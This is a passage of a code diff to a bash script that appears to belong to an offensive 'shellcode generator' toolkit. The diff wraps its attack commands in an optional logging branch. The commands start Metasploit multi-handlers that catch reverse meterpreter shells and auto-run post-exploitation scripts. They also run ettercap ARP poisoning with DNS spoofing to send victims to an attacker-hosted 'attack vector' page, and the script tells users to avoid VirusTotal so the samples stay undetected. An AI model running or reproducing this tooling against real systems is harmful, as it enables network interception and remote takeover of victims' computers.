-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "- POST EXPLOIT : $P0"
@@ -4639,8 +5708,21 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -4727,7 +5809,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
+        fi
       sleep 2
 
 
@@ -4759,9 +5855,25 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "- POST EXPLOIT : $P0"
@@ -4770,8 +5882,21 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
